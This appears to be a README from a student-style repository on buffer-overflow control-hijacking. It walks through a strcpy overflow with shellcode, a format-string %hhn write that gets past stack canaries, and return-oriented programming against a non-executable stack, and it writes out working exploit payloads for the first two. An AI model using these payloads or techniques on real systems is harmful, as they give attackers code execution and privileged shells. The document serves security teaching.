# Control Hijacking Attack
In this repository, I implemented some buffer overflow controlling hijacking attacks which all are described down below. You can find Executable Linkable Formats(ELF) of these
programs named "prog_vuln#" and corresponding inputs for each of them named "expoit#.sh" which were designed to overflow the buffers of program and rewrite some specific addresses
of the memory to change control flow of the program which will result in getting shell with sudo privileged.
## prog_vuln1
To perform this attack I used vulnerability of <b>strcpy()</b> function which does not check the length of strings before copy. As a result it will be possible to perform <b>buffer overflow</b> write some specific 
addresses in the stack and change the pointer to the start of shell code. You can see related commands in the following.
```
$(python -c 'print("\x90"*63 +
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x0
8\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "w"
*500 + "\x90\xf0\xff\xbf")')
```
## prog_vuln3
In this part there are some <b>canaries</b> (stack guard) in the address space of the program. So it isn't possible to overflow the program because all return addresses will be protected by these structures. To perform the attack I used <b>format stringing</b>. In this approach we exploit vulnerability of <b>printf()</b> function.   
We know that every time we use "%n"
in printf(), this function will write number of the bytes before this symbol at the top of stack. But It's not possible to enter these huge number of inputs to printf(), So I'll use "%hhn" that only writes the number of inputs in one byte of address which placed top of the stack. so we should sort all bytes of addresses which we want to write on and place the desired addressed in reverse order at the top of stack. you can see the designed input down below.
```
$(python -c
'print("\xb8\xfb\xff\xbf\xb7\xfb\xff\xbf\xb6\xfb\xff\xbf\xb5\xfb\xff\xbf\x9d\xfb\xff\xbf\xa4\xfb\xff\x
bf\xa0\xfb\xff\xbf\x9c\xfb\xff\xbf\xa1\xfb\xff\xbf\xa5\xfb\xff\xbf" + 160 * "w" + "%n%hhn%hhn" +
104 * "w" + "%hhn" + 11 * "w" + "%hhn" + 18 * "w" + "%hhn" + 35 * "w" + "%hhn" + 8 * "w" + "%hhn"
+ 64 * "w" +"%hhn" + 11 * "w" + "%hhn" + "%hhn" + 9 * "w")')
```
## prog_vuln4
In this part I used vulnerabilities of <b>scanf()</b> function which doesn't check whether input string match the space dedicated for it or not.  
In this program stack guards were deactivated but there is <b>NON-Executable Stack</b> protection. Since there is no canaries in the address space, we can change the return address of functions by causing overflow in the scanf() input. But unlike the prog_vuln1 because of NON-Executable Stack protection it's not possible to place the shell code in the scanf() input.  
To overcome this type of protection, I used <b>Return-oriented programming</b>. In this type of exploit we should find some suitable gadgets in the assembly code of the program and sort them to execute a shell code. In the below figure you can see arrangment of stack after we rewrite the return address of main with buffer overflow.


